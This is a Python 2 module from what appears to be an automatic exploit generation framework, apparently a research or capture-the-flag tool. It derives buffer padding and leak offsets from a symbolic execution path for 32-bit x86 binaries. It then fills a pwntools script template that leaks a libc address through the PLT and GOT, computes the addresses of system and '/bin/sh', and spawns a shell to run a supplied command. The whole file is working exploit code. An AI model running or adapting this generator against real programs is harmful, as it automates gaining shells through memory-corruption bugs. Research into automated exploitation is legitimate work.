from ..exploit import Exploit
import logging
from ..payload import Payload
import os

l = logging.getLogger("aegg.exploits.rop")

SCRIPT = '''
from pwn import *
import sys

binary = '$binary$'
leak_symbol = '$leak_symbol$'
symbol = '$symbol$'
payload = $payload$
libc_path = '$libc$'
leak_off = $leak_off$
cmd = sys.argv[1]

elf = ELF(binary)
env = $env$
s = process(binary, env=env)

p = payload
p += (p32(elf.plt[leak_symbol]) +
      p32(elf.symbols['main']) + p32(elf.got[symbol]))
s.sendline(p)
r = s.recvrepeat(0.3)

libc = ELF(libc_path)
libc_base = u32(r[leak_off: leak_off + 4]) - libc.symbols[symbol]
print 'libc_base = ' + hex(libc_base)

system_addr = libc_base + libc.symbols['system']
print 'system_addr = ' + hex(system_addr)

str_bin_sh_addr = libc_base + libc.search('/bin/sh').next()
print 'str_bin_sh_addr = ' + hex(str_bin_sh_addr)

p = payload
s.sendline(p + p32(system_addr) + p32(0xdeadbeef) + p32(str_bin_sh_addr))
# get shell!
print s.recvrepeat(0.3)
s.sendline(cmd)
print s.recvrepeat(0.3)
'''


class ROP(Exploit):
    """
    leak based rop for x86 binary.
    """
    LB = -4
    UB = 4
    TARGET_SYMBOL = '__libc_start_main'

    def __init__(self, binary, path, analysis):
        super(ROP, self).__init__(binary, path, analysis)
        # These range will try to ajust the incorrect offset.
        self._payload_range = ROP.LB
        self._leak_off_range = ROP.LB

    def _get_paylaod_leak_off(self):
        tmp = self.path.copy()
        state = tmp.state
        state.add_constraints(state.ip == 0x31323334)
        stdin = state.se.any_str(state.posix.get_file(0).all_bytes())
        stdout = state.se.any_str(state.posix.get_file(1).all_bytes())

        stdin_off = stdin.index('4321') + self._payload_range
        payload = stdin[: stdin_off]
        # + 12 because they're ret_addr, return2main and argv for leak function
        leak_off = stdout.index('4321') + 12 + self._leak_off_range
        return repr(payload), str(leak_off)

    def _generate(self, env):
        script = SCRIPT.strip()
        padding = self.analysis['padding'] + self._payload_range
        padding = 0 if padding < 0 else padding

        binary = self.binary
        leak_symbol = self.analysis['elf']['leak_symbol'][0]
        symbol = ROP.TARGET_SYMBOL
        libc = self.analysis['elf']['libc']
        try:
            payload, leak_off = self._get_paylaod_leak_off()
        except Exception, e:
            l.warning('Can not get payload or leak_off %s %s' % (Exception, e))
            return False
        script = script.replace('$binary$', binary)
        script = script.replace('$leak_symbol$', leak_symbol)
        script = script.replace('$symbol$', symbol)
        script = script.replace('$payload$', payload)
        script = script.replace('$libc$', libc)
        script = script.replace('$leak_off$', leak_off)
        script = script.replace('$env$', env)
        l.debug('script ...')
        l.debug(script)
        self.payload = script
        return True

    def gen_next(self):
        self._leak_off_range += 1
        if self._leak_off_range > ROP.UB:
            self._leak_off_range = ROP.LB
            self._payload_range += 1
        if self._payload_range > ROP.UB:
            return False
        return True

    def finish(self):
        self._payload_range = ROP.UB

    def generate(self):
        if (not self.analysis['ip_symbolic'] or
                self.analysis['padding'] == -1 or
                not self.analysis['elf']['leak_symbol'] or
                self.path.state.arch.name != 'X86'):
            l.info('Skipped rop exploit.')
            self.finish()
            return ''

        env = str({})
        curdir = os.path.dirname(self.binary)
        if os.path.isfile('%s/libc.so.6' % curdir):
            l.info('Use local libc.so.6')
            self.analysis['elf']['libc'] = '%s/libc.so.6' % curdir
            env = str({'LD_LIBRARY_PATH': curdir})
        if self._generate(env):
            return Payload(self.payload, 'script')
        return ''
